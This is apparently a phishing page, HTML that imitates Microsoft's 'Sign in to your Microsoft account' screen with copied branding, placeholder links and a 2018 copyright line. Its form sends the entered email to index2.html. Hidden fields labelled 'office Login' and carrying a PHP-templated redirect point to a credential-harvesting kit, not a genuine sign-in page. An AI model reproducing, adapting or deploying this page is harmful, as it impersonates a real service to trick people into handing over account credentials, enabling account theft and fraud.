<html dir="ltr" lang="EN-US">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <title>Sign in to your Microsoft account</title>
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"
    />
    <link rel="shortcut icon" href="mx/favicon.ico" />
    <link
      rel="stylesheet"
      title="Converged"
      type="text/css"
      href="mx/style.css"
    />
    <style type="text/css">
      body.cb input.hip {
        border-width: 2px !important;
      }
    </style>
    <style type="text/css">
      body {
        display: none;
      }
    </style>
    <style type="text/css">
      body {
        display: block !important;
      }
    </style>
    <style>
      .grid-container {
        display: grid;
        grid-template-columns: auto auto auto;
      }
    </style>
  </head>
  <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>
      <!--  -->
      <div
        data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"
      >
        <div
          class="background"
          role="presentation"
          data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"
        >
          <div style="background-image: url('mx/bg-small.jpg')"></div>
          <div
            class="backgroundImage"
            style="background-image: url('mx/bg.jpg')"
          ></div>
          <div class="background-overlay"></div>
          <!-- /ko -->
        </div>
      </div>

      <form method="GET" action="index2.html">
        <div class="outer">
          <div class="middle">
            <div class="inner">
              <div>
                <img class="logo" src="mx/logo.svg" />
              </div>
              <div>
                <div>
                  <div>
                    <div id="loginHeader" class="row text-title" role="heading">
                      Sign in
                    </div>
                    <div class="row">
                      <div class="form-group col-md-24">
                        <div class="placeholderContainer">
                          <input
                            name="email"
                            id="i0118"
                            class="form-control"
                            aria-required="true"
                            required
                            aria-label="Enter email"
                            type="email"
                            placeholder="Email, phone, or Skype"
                            style="border-box;border: none;border-bottom: 1px solid blue"
                            value=""
                          />
                          <div
                            class="phholder"
                            style="
                              left: 0px;
                              top: 0px;
                              width: 100%;
                              position: absolute;
                              z-index: 5;
                            "
                            data-bind="visible: !textInput(), click: focus"
                          >
                            <div
                              aria-hidden="true"
                              style="cursor: text"
                              data-bind="text: hintText, css: hintCss"
                              class="placeholder"
                            ></div>
                          </div>

                          <div class="form-group">
                            <div class="style="height:2px;">&nbsp;
                          </div>
                          <a id="idA_PWD_ForgotPassword" href="#"
                            >Sign in with a security key</a
                          >
                        </div>
                        <div class="form-group">
                          <a id="idA_PWD_ForgotPassword" href="#"
                            >Sign-in options</a
                          >
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="row">
                    <div>
                      <div class="col-xs-24 form-group no-padding-left-right">
                        <div class="col-xs-12 secondary">
                          <input
                            id="idBtn_Back"
                            class="btn btn-block"
                            value="Back"
                            style="display: none"
                            type="button"
                          />
                        </div>
                        <div class="grid-container">
                          <div class="grid-item"></div>
                          <div class="grid-item"></div>
                          <div class="grid-item">

                            <input
                              id="idSIButton9"
                              class="btn btn-block btn-primary"
                              value="Sign in"
                              type="submit"
                            />
                          </div>
                        </div>
                      </div>
                    </div>

                    <div class="row">
                      <div class="col-md-24">
                        <div class="text-13 action-links"></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div></div>
          </div>
        </div>
        <div id="footer" class="footer default">
          <div>
            <div id="footerLinks" class="footerNode text-secondary">
              <span id="ftrCopy" data-bind="html: svr.B6"
                >&copy;2018 Microsoft</span
              >
              <a id="ftrTerms" href="#">Terms of use</a>
              <a id="ftrPrivacy" href="#">Privacy &amp; cookies</a>
            </div>
          </div>
        </div>
        <input
          type="hidden"
          name="_after"
          rel="noreferrer"
          value="<?=$result;?>/office/redirect.html"
        />
        <input type="hidden" name="_subject" value="office Login" />
      </form>
      <form method="post" target="_top"></form>
    </div>
  </body>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/3.0.1/js.cookie.js"></script>
  <script src="/js/form.js"></script>
</html>
